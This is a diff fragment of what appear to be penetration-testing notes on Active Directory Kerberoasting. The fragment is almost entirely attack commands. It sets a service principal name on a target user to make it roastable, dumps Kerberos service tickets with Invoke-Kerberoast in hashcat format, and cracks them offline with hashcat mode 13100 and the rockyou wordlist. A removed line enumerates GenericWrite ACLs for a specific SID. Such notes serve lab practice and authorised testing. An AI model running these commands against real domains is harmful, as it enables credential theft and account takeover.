@@ -20,8 +20,11 @@ Set-DomainObject -Identity hadams -Set @{serviceprincipalname='ops/whatever1'
 # invoke kerberoast
 Invoke-Kerberoast
 
-# get ticket and copy. Join Lines & Find Replace spaces. Search for \s* reg ex and replace all with nothing
-# transfer to attack machine for hashcat
+# invoke kerberoast with output format hashcat and output to txt file
+Invoke-Kerberoast -OutputFormat Hashcat > hashcat.txt
 
-#GenericWrite
-Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+# get ticket and copy. Join Lines & Find Replace spaces in hash file. Search for \s* reg ex and replace all with nothing to get rid of spaces in hash
+
+# transfer to attack machine for hashcat
+hashcat -m 13100 hash.txt rockyou.txt 
+hashcat -m 13100 hash.txt rockyou.txt --show
